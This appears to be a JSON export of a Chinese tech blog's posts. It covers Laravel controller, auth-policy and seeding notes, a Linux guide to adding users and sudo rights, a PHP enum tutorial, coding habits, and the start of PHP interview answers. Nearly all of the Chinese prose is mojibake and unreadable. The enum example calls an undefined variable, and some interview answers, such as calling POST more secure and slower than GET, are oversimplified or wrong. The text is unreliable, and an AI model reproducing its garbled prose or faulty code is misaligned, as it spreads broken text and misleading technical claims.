ç¬¬å…­ç« é€šå¸¸å¼€å‘ç¼–è¾‘ç”¨æˆ·æ—¶ï¼Œéœ€è¦å…ˆä»æ•°æ®åº“ä¸­è·å–åˆ°è¯¥ç”¨æˆ·å½“å‰çš„ä¿¡æ¯ï¼Œç„¶åå†è¿›è¡Œç¼–è¾‘ã€‚ åœ¨Laravel ä¸­ï¼Œåªéœ€è¦å‡ è¡Œä»£ç å°±å¯ä»¥å®Œæˆè¿™ä»¶äº‹æƒ…ã€‚ 123public function edit(User $user)&#123; return view(&quot;users.edit&quot;, compact(&quot;user&quot;))&#125; è¿™é‡Œé€šè¿‡ã€éšå½¢è·¯ç”±ç»‘å®šã€ï¼ŒæŠŠå¯¹åº”ID çš„ç”¨æˆ·çš„å®ä¾‹ä½œä¸ºæ§åˆ¶å™¨å‚æ•°ã€‚ ä¸­é—´ä»¶è®¿é—®é™åˆ¶æœ‰æ—¶æˆ‘ä»¬ä¼šå¸Œæœ›æœªç™»å½•çš„ç”¨æˆ·ï¼Œä¸èƒ½è®¿é—®æŸäº›åŠŸèƒ½ï¼Œè¿™æ—¶å¯ä»¥é€šè¿‡ Auth æä¾›çš„ä¸­é—´å¾ˆæ–¹ä¾¿çš„å®Œæˆã€‚ 1234$this-&gt;middleware(&quot;auth&quot;, [ &#x2F;&#x2F; æŒ‡å®šè¿™å‡ ä¸ªæ–¹æ³•ä¸ä½¿ç”¨Auth å»éªŒè¯ &quot;except&quot; &#x3D;&gt; [&quot;show&quot;, &quot;create&quot;, &quot;store&quot;, &quot;index&quot;, &quot;confirmEmail&quot;]]); æˆæƒéªŒè¯ä½†éœ€è¦æ³¨æ„çš„æ—¶ï¼Œè¿™é‡Œä»…ä»…é™åˆ¶çš„æ˜¯æœªç™»å½•ï¼Œè€Œæœ‰äº›åŠŸèƒ½åˆ™æ˜¯éœ€è¦åœ¨ç™»å½•çŠ¶æ€ä¸‹è¿›è¡Œé™åˆ¶ï¼Œæ¯”å¦‚ï¼šID ä¸º1 çš„ç”¨æˆ·ä¸èƒ½ä¿®æ”¹ID ä¸º2 çš„ç”¨æˆ·çš„ä¿¡æ¯ã€‚ è¿™ä¸ªå°±ä¸æ˜¯ä¸­é—´ä»¶èŒè´£èŒƒå›´å†…èƒ½åšçš„äº‹æƒ…äº†ï¼Œè¿™ä¸ªéœ€è¦æˆæƒç­–ç•¥æ¥å®Œæˆã€‚ 12345&#x2F;&#x2F; å®šä¹‰ç­–ç•¥public function update(User $currentUser, User $user)&#123; return $currentUser-&gt;id &#x3D;&#x3D;&#x3D; $user-&gt;id;&#125; è¿˜éœ€è¦åœ¨æ§åˆ¶å™¨ä¸­éªŒè¯æ‰ç®—æ­£çœŸä½¿ç”¨äº†ã€‚ 123456&#x2F;&#x2F; ä½¿ç”¨ç­–ç•¥public function update(User $user)&#123; $this-&gt;authorize(&quot;update&quot;, $user); &#x2F;&#x2F; ... &#125; æ•°æ®å¡«å……æ•°æ®å¡«å……éœ€è¦ä½¿ç”¨Seeder ç±»ï¼Œå¦‚æœéœ€è¦è¿›è¡Œæ•°æ®å¡«å……ï¼Œéœ€è¦è°ƒç”¨ Seeder çš„call æ–¹æ³•ã€‚ ä»¥ç”¨æˆ·æ¨¡å‹ä¸ºä¾‹ï¼Œå¡«å……æ­¥éª¤å¦‚ä¸‹ï¼š é¦–å…ˆåˆ›å»ºç”¨æˆ·å·¥å‚ï¼Œå®šä¹‰å¡«å……æ•°æ® 1$ php artisan make:factory UserFactroy åˆ›å»ºç”¨æˆ·ç”Ÿæˆå™¨ï¼Œå®ç°run æ–¹æ³• 1$ php artisan make:seeder UsersTableSeeder åœ¨DatabaseSeeder ç±»ä¸­å®ç°run æ–¹æ³•ï¼Œè°ƒç”¨ call æ–¹æ³• 123456789public function run()&#123; &#x2F;&#x2F; \\App\\Models\\User::factory(10)-&gt;create(); Model::unguard(); $this-&gt;call(UsersTableSeeder::class); Model::reguard();&#125; é‡ç½®æ•°æ®åº“ 1$ php artisan migrate:refresh å¡«å……æ•°æ® 1php artisan db:seed ç¬¬å…­ç« å­¦åˆ°äº†ä»€ä¹ˆ é€šè¿‡è·¯ç”±ä¼ å‚ä¸æ§åˆ¶å™¨è¿›è¡Œäº¤äº’ï¼ˆéšå½¢è·¯ç”±ç»‘å®š ä½¿ç”¨Patch åŠ¨ä½œæ›´æ–°ç”¨æˆ·ä¿¡æ¯ï¼ŒDelete åŠ¨ä½œåˆ é™¤ç”¨æˆ· ä½¿ç”¨Auth ä¸­é—´ä»¶è¿‡æ»¤ç”¨æˆ·è¯·æ±‚ã€guest ä¸­é—´ä»¶ ä½¿ç”¨æƒé™ç­–ç•¥ï¼Œå¯¹ä¸€äº›å¿…è¦çš„åŠ¨ä½œè¿›è¡Œæƒé™éªŒè¯ ä½¿ç”¨æ•°æ®å¡«å……æ¥ç”Ÿæˆå‡æ•°æ® é‡ç½®æ•°æ®åº“ä»¥åŠè¿ç§»æ•°æ®åº“å¹¶ç”Ÿæˆæ–°æ•°æ® é€šè¿‡æ•°æ®åº“è¿ç§»æ¥è¿›è¡Œæ•°æ®åº“å­—æ®µçš„æ›´æ–° ç¬¬ä¸ƒç« ä»€ä¹ˆæ—¶å€™åº”è¯¥åœ¨æ§åˆ¶å™¨ä¸­å¢åŠ User $user è¿™æ ·çš„ä»£ç å‘¢ï¼Ÿ çœ‹è·¯ç”±ï¼Œçœ‹è·¯ç”±ï¼Œçœ‹è·¯ç”±ï¼Œçœ‹è·¯ç”±æ˜¯å¦‚ä½•å®šä¹‰çš„ã€‚ å¦‚æœè·¯ç”±ä¸­æœ‰è¿™æ ·çš„ä¸œè¥¿ï¼Œé‚£ä¹ˆä¸€å®šè¦æ˜¯è¦çš„ã€‚ 1Route::get(&quot;&#x2F;users&#x2F;&#123;user&#125;&quot;, &quot;UserController@show&quot;)-&gt;name(&quot;users.show&quot;); è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸ºéšå½¢è·¯ç”±ç»‘å®šã€‚ è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªç»†èŠ‚å°±æ˜¯å¦‚ä½•åˆ¤æ–­ä¸€ä¸ªè·¯ç”±æˆ–è€…ä¸€ä¸ªæ§åˆ¶å™¨æ˜¯å¦æ˜¯éšå½¢è·¯ç”±ç»‘å®šï¼Ÿé™¤äº†åªæ˜¯çœ‹è·¯ç”±ä¹‹å¤–ï¼Œè¿˜éœ€è¦çœ‹æ˜¯å¦æœ‰ä¸ä¹‹å¯¹åº”çš„æ¨¡å‹ã€‚è¿™ä¸€ç‚¹å¾ˆé‡è¦å“¦ã€‚ å¦å¤–ä»€ä¹ˆæ—¶å€™éœ€è¦Request $request å‘¢ï¼Ÿä¹Ÿæ˜¯çœ‹è·¯ç”±ï¼ŒPost æ–¹æ³•ä¸€å®šéœ€è¦çš„ã€‚ 12345678910111213&#x2F;&#x2F; å®šä¹‰è·¯ç”±Route::get(&quot;password&#x2F;&#123;token&#125;&quot;, &quot;PasswordController@showResetForm&quot;)-&gt;name(&quot;password.reset&quot;);&#x2F;&#x2F; æ–¹å¼ä¸€public function showResetForm($token)&#123; var_dump($token);&#125;&#x2F;&#x2F; æ–¹å¼äºŒpublic function showResetForm(Request $request)&#123; $token &#x3D; $request-&gt;route()-&gt;parameter(&#39;token&#39;); var_dump($token);&#125; Laravel ä¸­çš„å‡ ç§æ“ä½œæ•°æ®åº“çš„æ–¹å¼ï¼š 1234567891011121314151617181920public function store(User $user)&#123; &#x2F;&#x2F; æ–¹å¼ä¸€ $user-&gt;name &#x3D; &quot;boo&quot;; $user-&gt;save(); &#x2F;&#x2F; æ–¹å¼äºŒ $user-&gt;update([ &quot;name&quot; &#x3D;&gt; &quot;boo&quot;, ]); &#x2F;&#x2F; æ–¹å¼ä¸‰ User::where(&quot;id&quot;, $user-&gt;id)-&gt;update([ &quot;name&quot; &#x3D;&gt; &quot;boo&quot;, ]); &#x2F;&#x2F; æ–¹å¼å›› DB::table(&quot;users&quot;)-&gt;where(&quot;id&quot;, $user-&gt;id)-&gt;update([ &quot;name&quot; &#x3D;&gt; &quot;boo&quot;, ]);&#125; ç¬¬ä¸ƒç« å­¦åˆ°äº†ä»€ä¹ˆ ä½¿ç”¨è¿ç§»ä¸ºæ•°æ®åº“è¡¨å¢åŠ å­—æ®µ åœ¨æ¨¡å‹ä¸­ï¼Œå®šä¹‰ç›‘å¬å™¨ï¼Œç›‘å¬æ“ä½œ ä½¿ç”¨Laravel å‘é€é‚®ä»¶åŠŸèƒ½ åœ¨æœ¬åœ°ï¼ˆlogï¼‰è°ƒè¯•å‘é€é‚®ä»¶åŠŸèƒ½ é€šè¿‡é‚®ä»¶å‘é€æ³¨å†Œé“¾æ¥æ¥æ¿€æ´»ç”¨æˆ· é€šè¿‡é‚®ä»¶æ¥æ‰¾å›å¯†ç  ç¬¬å…«ç«  Laravel ä¸­æ¨¡å‹ä¸æ¨¡å‹ä¹‹é—´æ˜¯å¦‚ä½•è¿›è¡Œå…³è”çš„å‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯é€šè¿‡ä¸»é”®ä¸å¤–é”®è¿›è¡Œå…³è”ã€‚ é€šè¿‡Eloquent å…³è”æ¨¡å‹ä¸æ¨¡å‹ä¹‹é—´çš„å…³ç³»ï¼š ä¸€å¯¹ä¸€ ä¸€å¯¹å¤š å¤šå¯¹ä¸€ å¤šå¯¹å¤š Auth::user() æ–¹æ³•å¯ä»¥è·å–åˆ°å½“å‰ç”¨æˆ·çš„å®ä¾‹ã€‚ åœ¨Useræ¨¡å‹ä¸­å®šä¹‰äº†ä¸€ä¸ªæ–¹æ³•ï¼Œç„¶åé€šè¿‡Auth::user()è·å–åˆ°çš„å®ä¾‹è¿›è¡Œè°ƒç”¨ã€‚ å¦‚æœæ²¡æœ‰ä¸€å¯¹å¤šçš„å…³ç³»ï¼Œéœ€è¦è¿™æ ·åˆ›å»ºä¸€æ¡å¾®åšï¼š 1App\\Models\\Status::create() å¦‚æœå°†ç”¨æˆ·æ¨¡å‹ä¸å¾®åšæ¨¡å‹è¿›è¡Œå…³è”ä¹‹åï¼Œå¯ä»¥å¾—åˆ°ä»¥ä¸‹æ–¹æ³•ï¼š 1$user-&gt;statuses()-&gt;create() å…¶ä¸­statuses() æ˜¯åœ¨ç”¨æˆ·æ¨¡å‹ä¸­å®šä¹‰å¥½çš„ï¼ˆåç§°å¯ä»¥ä¸ä¸€æ ·)ï¼š 12345public function statuses()&#123; &#x2F;&#x2F; userè¡¨æ­£å‘å…³è” statusè¡¨ return $this-&gt;hasMany(Status::class, &quot;user_id&quot;, &quot;id&quot;);&#125; ç¬¬å…«ç« å­¦åˆ°äº†ä»€ä¹ˆ ä¸¤ä¸ªæ¨¡å‹ä¹‹é—´å¦‚ä½•è¿›è¡Œå…³è” é€šè¿‡æ¨¡å‹å…³è”è·å–æ•°æ® å¯¹å¾®åšå‘å¸ƒæ—¶é—´è¿›è¡Œå‹å¥½å¤„ç†ï¼Œå¹¶ä¸­æ–‡åŒ– å»ºç«‹å·¥å‚ã€ä»¥åŠç”Ÿæˆå™¨ã€å¹¶ç”Ÿæˆå‡æ•°æ® é€šè¿‡æ•°æ®å…³è”æ¥åˆ›å»ºå¾®åš é€šè¿‡æ•°æ®å…³è”æ¥åˆ é™¤å¾®åš ä¿®å¤æ‰¹é‡èµ‹å€¼çš„é”™è¯¯ ç¬¬ä¹ç« æ­£å¼å†™SQL ä¹‹å‰ï¼Œå¯ä»¥å…ˆä½¿ç”¨tinker é€šè¿‡æ¨¡å‹æ“ä½œæ•°æ®ã€‚ é€šè¿‡åœ¨æ¨¡å‹ä¸­å®šä¹‰ä¸€äº›æ–¹æ³•ï¼Œä»¥ä¾¿å¯ä»¥åœ¨å…¶ä»–åœ°æ–¹ç›´æ¥è·å–åˆ°æ•°æ®ã€‚ ç¬¬ä¹ç« å­¦åˆ°äº†ä»€ä¹ˆ å¤šå¯¹å¤šå…³ç³»åº”ç”¨ æ–°å¢å’Œé”€æ¯å¤šå¯¹å¤šå…³è” ä½¿ç”¨ with æ¥é¿å…N+1 é—®é¢˜","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"Linux æ·»åŠ ç”¨æˆ·åŠææƒ","slug":"linux-to-add-users-and-rights","date":"2021-03-12T14:04:50.000Z","updated":"2021-03-13T04:18:51.999Z","comments":true,"path":"linux-to-add-users-and-rights/","link":"","permalink":"https://www.0x2beace.com/linux-to-add-users-and-rights/","excerpt":"åˆšæ‹¿åˆ°ä¸€å°æœåŠ¡å™¨æ—¶ï¼Œé€šå¸¸ä¼šç¦ç”¨root ç”¨æˆ·ç™»å½•ï¼Œè€Œä½¿ç”¨å…¶ä»–æ™®é€šç”¨æˆ·ï¼Œè¿™æ—¶å°±éœ€è¦åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·ã€‚","text":"åˆšæ‹¿åˆ°ä¸€å°æœåŠ¡å™¨æ—¶ï¼Œé€šå¸¸ä¼šç¦ç”¨root ç”¨æˆ·ç™»å½•ï¼Œè€Œä½¿ç”¨å…¶ä»–æ™®é€šç”¨æˆ·ï¼Œè¿™æ—¶å°±éœ€è¦åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·ã€‚ æ·»åŠ ç”¨æˆ·åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·ï¼š 1$ useradd boo è®¾ç½®å¯†ç ï¼š 1$ passwd boo ææƒæ­¤æ—¶æ­¤ç”¨æˆ·å·²ç»å¯ä»¥æ­£å¸¸ä½¿ç”¨äº†ï¼Œä½†æ˜¯è¿˜æ²¡æœ‰ææƒï¼Œæ‰€ä»¥å¾ˆå¤šäº‹æƒ…åšä¸äº†ï¼Œè¿™æ—¶å¯ä»¥æŠŠè¯¥ç”¨æˆ·åŠ å…¥sudo ç”¨æˆ·ç»„ï¼Œé€šè¿‡sudoå‘½ä»¤æ¥è¿›è¡Œææƒã€‚ 1$ usermod -G sudo boo ä¸€èˆ¬ç›´æ¥å°±åŠ å…¥æˆåŠŸäº†ï¼Œä½†æ˜¯æœ‰äº›å‘è¡Œç‰ˆæœ¬é»˜è®¤å¹¶æ²¡æœ‰sudoç”¨æˆ·ç»„ï¼Œæ‰€ä»¥è¿™æ—¶éœ€è¦å…ˆæ·»åŠ ç”¨æˆ·ç»„ã€‚ 1$ groupadd sudo æ‰‹åŠ¨æ·»åŠ å®Œç”¨æˆ·ç»„ä¹‹åï¼Œè¿˜éœ€è¦ä¿®æ”¹sudoersé…ç½®æ–‡ä»¶ï¼Œè¿™é‡Œæœ‰å‡ ç§æ–¹å¼ï¼Œæ ¹æ®å®é™…æƒ…å†µè¿›è¡Œé€‰æ‹©ï¼š å…è®¸sudo ç»„çš„æˆå‘˜æ‰§è¡Œä»»ä½•å‘½ä»¤ 12345$ sudo visudo &#x2F;&#x2F; æˆ–è€… sudo vim &#x2F;etc&#x2F;sudoers&#x2F;&#x2F; æ·»åŠ ä»¥ä¸‹å†…å®¹# the &#39;sudo&#39; group has all the sudo privileges%sudo ALL&#x3D;(ALL:ALL) ALL ç›´æ¥å…è®¸è¯¥ç”¨æˆ·æ‰§è¡Œä»»ä½•å‘½ä»¤12345$ sudo visudo &#x2F;&#x2F; æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼Œæ³¨æ„ï¼šæ²¡æœ‰% # Allow boo to run any commands anywhereboo ALL&#x3D;(ALL:ALL) ALL é€šå¸¸è¿˜æ˜¯å»ºè®®å°†ç”¨æˆ·æ·»åŠ è‡³sudo ç”¨æˆ·ç»„ï¼Œç„¶åèµ‹äºˆsudo ç»„æˆå‘˜æƒé™ï¼Œè€Œä¸æ˜¯ç›´æ¥å¯¹å…·ä½“æŸä¸ªç”¨æˆ·è¿›è¡Œææƒã€‚ æ€»ç»“æŸ¥çœ‹æ‰€æœ‰ç”¨æˆ·çš„åˆ—è¡¨ï¼š 1$ cat &#x2F;etc&#x2F;passwd æŸ¥çœ‹æ‰€æœ‰ç”¨æˆ·ç»„ï¼š 1$ cat &#x2F;etc&#x2F;group æŸ¥çœ‹å½“å‰ç™»å…¥ç”¨æˆ·çš„ç»„ï¼š 1$ groups æŸ¥çœ‹æŒ‡å®šç”¨æˆ·æ‰€åœ¨çš„ç»„ï¼š 1$ groups usernmae æ·»åŠ ç”¨æˆ·ï¼š 1$ useradd username è®¾ç½®(é‡ç½®)å¯†ç ï¼š 1$ passwd username æ·»åŠ ç”¨æˆ·ç»„ï¼š 1$ groupadd group_name å°†æŸä¸ªç”¨æˆ·æ·»åŠ åˆ°æŸä¸ªç»„ï¼š 1$ usermod -G group_name username ç¼–è¾‘sudoers é…ç½®æ–‡ä»¶ï¼š 1$ sudo visudo","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"å¦‚ä½•åœ¨ PHP ä¸­ä½¿ç”¨æšä¸¾","slug":"how-do-I-use-enumerations-in-php","date":"2021-03-08T12:57:51.000Z","updated":"2021-03-08T12:59:13.169Z","comments":true,"path":"how-do-I-use-enumerations-in-php/","link":"","permalink":"https://www.0x2beace.com/how-do-I-use-enumerations-in-php/","excerpt":"åœ¨ç¼–å†™ä¸šåŠ¡ä»£ç æ—¶ï¼Œå¸¸å¸¸ä¼šé‡åˆ°çŠ¶æ€æˆ–è€…ç±»å‹ä¸ä¸€è‡´é€ æˆçš„é€»è¾‘åˆ†æ”¯ï¼Œè¿™æ—¶ï¼Œæœ€å¿Œè®³çš„æ˜¯ç›´æ¥åœ¨ä¸šåŠ¡ä»£ç ä¸­å¯¹æ•°å€¼è¿›è¡Œåˆ¤æ–­ã€‚","text":"åœ¨ç¼–å†™ä¸šåŠ¡ä»£ç æ—¶ï¼Œå¸¸å¸¸ä¼šé‡åˆ°çŠ¶æ€æˆ–è€…ç±»å‹ä¸ä¸€è‡´é€ æˆçš„é€»è¾‘åˆ†æ”¯ï¼Œè¿™æ—¶ï¼Œæœ€å¿Œè®³çš„æ˜¯ç›´æ¥åœ¨ä¸šåŠ¡ä»£ç ä¸­å¯¹æ•°å€¼è¿›è¡Œåˆ¤æ–­ã€‚ é‚£ä¹ˆæ›´å¥½çš„æ–¹å¼åº”è¯¥æ˜¯æ€æ ·å‘¢ï¼Ÿä½¿ç”¨æšä¸¾ã€‚ ä½¿ç”¨æšä¸¾æœ‰ä»¥ä¸‹å‡ ä¸ªå¥½å¤„ï¼š å‡å°‘å› ä¸ºç›´æ¥è¾“å…¥æ•°å­—è€Œå¯¼è‡´çš„é”™è¯¯ ä½¿ä»£ç æ›´æ˜“äºé˜…è¯» æ–¹ä¾¿ç»´æŠ¤ï¼Œåé¢éœ€è¦æ·»åŠ æ–°çš„ç±»å‹æ—¶ï¼Œä¸ä¼šçªå…€ PHP æœ¬èº«ä¸æ”¯æŒæšä¸¾ï¼Œä½†æ˜¯ä½¿ç”¨ç±»ä¸­çš„å¸¸é‡å»å®šä¹‰å¯ä»¥å®ç°ç­‰ä»·çš„æ•ˆæœã€‚ å®šä¹‰æšä¸¾ä¸‹é¢ä¸ºç”¨æˆ·ç±»å‹åˆ›å»ºä¸€ä¸ªæšä¸¾ï¼Œç”¨æˆ·å¯ä»¥æ˜¯ä»¥ä¸‹ä¸‰ç§ç±»å‹ä¹‹ä¸€ï¼š æ™®é€šç”¨æˆ· ç®¡ç†å‘˜ è¶…çº§ç®¡ç†å‘˜ çœ‹èµ·æ¥åƒè¿™æ ·ï¼š 123456class UserType extends Enum&#123; const MEMBER &#x3D; 1; const ADMIN &#x3D; 2; const SUPERADMIN &#x3D; 3;&#125; ä½¿ç”¨æšä¸¾123if ($user-&gt;type &#x3D;&#x3D;&#x3D; UserType::MEMBER)&#123; &#x2F;&#x2F; todo &#125; å¦‚æœæˆ‘ä»¬ä¸ä½¿ç”¨æšä¸¾ï¼Œä»£ç å¯èƒ½å°±ä¼šå˜æˆè¿™æ ·ï¼š 1234567if ($user-&gt;type &#x3D;&#x3D;&#x3D; 1) &#123; &#x2F;&#x2F; è¿™ä¸ª1è¡¨ç¤ºä»€ä¹ˆ?? &#x2F;&#x2F; todo&#125;if ($user-&gt;type &#x3D;&#x3D;&#x3D; &#39;Member&#39;) &#123; &#x2F;&#x2F; è¿™ä»–å¦ˆå’‹ä¹ˆåˆæ˜¯å­—ç¬¦ä¸² ğŸ˜ &#x2F;&#x2F; todo &#125; å®šä¹‰è·å–å™¨å¾ˆå¤šæ—¶å€™æˆ‘ä»¬å¸Œæœ›èƒ½è·å–åˆ°æŸä¸ªç±»å‹å¯¹åº”çš„å…·ä½“å«ä¹‰ï¼Œè¿™æ—¶å¯ä»¥é€šè¿‡å®šä¹‰è·å–å™¨æ¥è·å–ã€‚ 12345678910111213class UserType extends Enum&#123; public static $userType &#x3D; [ self::MEMBER &#x3D;&gt; &quot;æ™®é€šä¼šå‘˜&quot;, self::ADMIN &#x3D;&gt; &quot;ç®¡ç†å‘˜&quot;, self::SUPERADMIN &#x3D;&gt; &quot;è¶…çº§ç®¡ç†å‘˜&quot; ]; public static function getUserType($type) &#123; return self::$voucherMap[$type]; &#125; &#125; è¿™æ ·å½“æˆ‘ä»¬åœ¨è°ƒç”¨getUserType æ–¹æ³•æ—¶ï¼Œåªéœ€è¦ä¼ å…¥å¯¹åº”çš„ç±»å‹ï¼Œå°±èƒ½è·å–åˆ°æ™®é€šä¼šå‘˜ã€ç®¡ç†å‘˜ã€è¶…çº§ç®¡ç†å‘˜äº†ã€‚ å‚è€ƒé“¾æ¥ åœ¨ Laravel ä¸­ä½¿ç”¨æšä¸¾","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"å†™ä»£ç çš„å¥½ä¹ æƒ¯","slug":"good-habit-of-writing-code","date":"2021-03-02T14:20:53.000Z","updated":"2021-04-10T01:52:32.612Z","comments":true,"path":"good-habit-of-writing-code/","link":"","permalink":"https://www.0x2beace.com/good-habit-of-writing-code/","excerpt":"å‰æ®µæ—¶é—´çœ‹åˆ°ä¸€ç¯‡æ¯”è¾ƒç«çš„æ–‡ç« ï¼Œç»“åˆè‡ªå·±çš„ä¸€äº›ç»éªŒï¼Œæ•´ç†ä»¥ä¸‹â€œå¥½ä¹ æƒ¯â€ã€‚","text":"å‰æ®µæ—¶é—´çœ‹åˆ°ä¸€ç¯‡æ¯”è¾ƒç«çš„æ–‡ç« ï¼Œç»“åˆè‡ªå·±çš„ä¸€äº›ç»éªŒï¼Œæ•´ç†ä»¥ä¸‹â€œå¥½ä¹ æƒ¯â€ã€‚ ä¿®æ”¹å®Œä»£ç ï¼Œä¸€å®šè¦è®°å¾—è‡ªæµ‹ä¸€ä¸‹ï¼Œå³ä½¿åªæ˜¯æ”¹äº†ä¸€ä¸ªå˜é‡ã€‚ æ–¹æ³•å…¥å‚å°½é‡éƒ½åšæ ¡éªŒã€‚ æ·»åŠ æ–°æ¥å£æ—¶ï¼Œéœ€è¦æ³¨æ„è€æ¥å£çš„å…¼å®¹æ€§ã€‚ å¯¹äºå¤æ‚çš„ä»£ç é€»è¾‘ï¼Œæœ‰å¿…è¦å†™æ¸…æ¥šæ³¨é‡Šã€‚ ä½¿ç”¨å®ŒIO èµ„æºæµï¼Œä¸€å®šè¦è®°å¾—å…³é—­ã€‚ å°½é‡ä¸è¦åœ¨å¾ªç¯é‡Œè¿œç¨‹è°ƒç”¨æˆ–è€…æ•°æ®åº“æ“ä½œï¼Œç‰¹åˆ«æ˜¯selectã€‚ä¼˜å…ˆè€ƒè™‘æ‰¹å¤„ç†ã€‚ è€ƒè™‘å¹¶å‘ä¸€è‡´æ€§çš„é—®é¢˜ã€‚ æ ¹æ®å®é™…çš„ä¸šåŠ¡åœºæ™¯å»æ‹†è§£åŠŸèƒ½ï¼Œä¸æ˜¯æ‰€æœ‰çš„åŠŸèƒ½éƒ½éœ€è¦ç”¨ç‰¹åˆ«é«˜æ·±çš„æŠ€æœ¯å»å®ç°ã€‚ é¿å…å¤šå±‚if...elseåµŒå¥—ã€‚ ä¸€ä¸ªç±»åšå¥½ä¸€ä»¶äº‹æƒ…ï¼Œä¸€ä¸ªæ§åˆ¶å™¨ç»´æŠ¤å¥½ä¸€ä¸ªåŠŸèƒ½ã€‚ å‚è€ƒé“¾æ¥ å†™ä»£ç æœ‰è¿™16ä¸ªå¥½ä¹ æƒ¯ï¼Œå¯ä»¥å‡å°‘80%éä¸šåŠ¡çš„bug","categories":[{"name":"ç¢ç¢å¿µ","slug":"ç¢ç¢å¿µ","permalink":"https://www.0x2beace.com/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}],"tags":[{"name":"ç¢ç¢å¿µ","slug":"ç¢ç¢å¿µ","permalink":"https://www.0x2beace.com/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}]},{"title":"PHP å¸¸è§é¢è¯•é¢˜æ•´ç†","slug":"php-common-interview-questions","date":"2021-02-25T11:51:45.000Z","updated":"2021-03-12T14:05:10.121Z","comments":true,"path":"php-common-interview-questions/","link":"","permalink":"https://www.0x2beace.com/php-common-interview-questions/","excerpt":"å¹´å‰å¹´åè¿™æ®µæ—¶é—´ä¸€ç›´åœ¨ä¸ºé¢è¯•åšå‡†å¤‡ï¼Œæœ¬æ–‡å°†ä»ç½‘ç»œã€PHPã€Mysqlã€Redisã€Linux è¿™å‡ éƒ¨åˆ†æ•´ç†ä¸€ä¸‹å¸¸è§çš„ä¸€äº›é¢è¯•ç®€ç­”é¢˜ã€‚","text":"å¹´å‰å¹´åè¿™æ®µæ—¶é—´ä¸€ç›´åœ¨ä¸ºé¢è¯•åšå‡†å¤‡ï¼Œæœ¬æ–‡å°†ä»ç½‘ç»œã€PHPã€Mysqlã€Redisã€Linux è¿™å‡ éƒ¨åˆ†æ•´ç†ä¸€ä¸‹å¸¸è§çš„ä¸€äº›é¢è¯•ç®€ç­”é¢˜ã€‚ ç½‘ç»œç¯‡å¸¸è§çš„çŠ¶æ€ç åŠå…¶å«ä¹‰ çŠ¶æ€ç  å«ä¹‰ 200 è¯·æ±‚æˆåŠŸ 301 é‡å®šå‘ 304 èµ„æºæœªè¢«ä¿®æ”¹å¯ä»¥ä½¿ç”¨æ—§èµ„æº 404 èµ„æºæ‰¾ä¸åˆ° 403 è¯·æ±‚è¢«æ‹’ç» 500 æœåŠ¡ç«¯é”™è¯¯ 502 ç½‘å…³é”™è¯¯ 504 ç½‘å…³è¶…æ—¶ è¡¨å•æäº¤ get å’Œ post çš„åŒºåˆ« Get è¯·æ±‚æ˜¯å°†è¯·æ±‚å‚æ•°æ”¾åœ¨ url åé¢ï¼Œç­‰åŒäºç›´æ¥æ”¾åœ¨äº†è¯·æ±‚å¤´ä¸­ï¼ŒPost è¯·æ±‚åˆ™æ˜¯æŠŠè¯·æ±‚å‚æ•°æ”¾åœ¨è¯·æ±‚ä½“ä¸­ã€‚ Post æ›´å®‰å…¨ï¼Œä¸ä¼šä½œä¸ºurlçš„ä¸€éƒ¨åˆ†ï¼Œä¸ä¼šè¢«ç¼“å­˜åŠä¿å­˜åœ¨æµè§ˆå™¨è®°å½•ä¸­ã€‚ Post èƒ½å‘é€æ›´å¤šçš„å†…å®¹åŠæ›´å¤šçš„æ•°æ®ç±»å‹ï¼Œget åªèƒ½å‘é€ 2048 ä¸ªASCII å­—ç¬¦ Post æ¯”Get æ…¢ï¼ˆåŸå› æ˜¯å› ä¸ºpost éœ€è¦åœ¨æœåŠ¡å™¨ç¡®è®¤ä¹‹åå†å‘é€æ•°æ®ï¼‰ Get é€šå¸¸ç”¨äºèµ„æºçš„è·å–ï¼ŒPost é€šå¸¸ç”¨äºèµ„æºçš„æ›´æ–° http å’Œ https çš„åŒºåˆ« é¦–å…ˆä¸¤è€…æ‰€ä½¿ç”¨çš„åè®®ä¸ä¸€æ ·ï¼Œå…¶ç«¯å£ä¹Ÿä¸ä¸€æ ·ã€‚ è¿™ä¹Ÿæ˜¯https æ¯” http è¦å®‰å…¨çš„åŸå› ï¼Œhttp æ˜¯æ˜æ–‡ä¼ è¾“ï¼Œæ•°æ®éƒ½æ˜¯æœªåŠ å¯†çš„ï¼Œè€Œhttps åˆ™æ˜¯ ssl + http åè®®è¿›è¡ŒåŠ å¯†ä¼ è¾“ã€‚ http æ¯” https è¦å¿«ï¼Œè¿™æ˜¯å› ä¸ºhttp åªéœ€è¦è¿›è¡Œtcp ä¸‰æ¬¡æ¡æ‰‹è¿æ¥ï¼Œåªéœ€è¦äº¤æ¢ä¸‰ä¸ªåŒ…ï¼Œè€Œ https é™¤äº†è¿›è¡Œtcp è¿æ¥ï¼Œè¿˜éœ€è¦ ssl æ¡æ‰‹çš„ä¹ä¸ªåŒ…ï¼Œä¸€å…±æ˜¯åäºŒä¸ªåŒ…ã€‚ https æ˜¯æ„å»ºåœ¨http ä¹‹ä¸Šçš„åè®®ï¼Œç†è®ºä¸Šï¼Œhttps ç›¸è¾ƒ http ä¼šæ›´æ¶ˆè€—æœåŠ¡å™¨èµ„æºã€‚ session å’Œ cookie çš„åŒºåˆ« å­˜å‚¨æ–¹å¼ä¸åŒï¼šcookie 